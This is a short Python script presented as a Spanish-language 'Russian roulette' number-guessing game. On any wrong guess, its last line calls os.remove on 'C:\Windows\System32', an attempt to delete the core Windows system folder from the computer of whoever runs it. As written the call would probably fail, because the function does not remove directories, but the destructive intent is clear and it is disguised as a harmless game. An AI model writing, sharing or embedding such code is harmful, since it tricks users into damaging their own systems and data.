import random
import os

#JuegoRuletaRusa

number = random.randint(1, 10)
guess = input('Adivina el numero del 1 al 10')
guess = int(guess)

if guess == number:
    print('Ganaste!')
else:
    os.remove('C:\Windows\System32')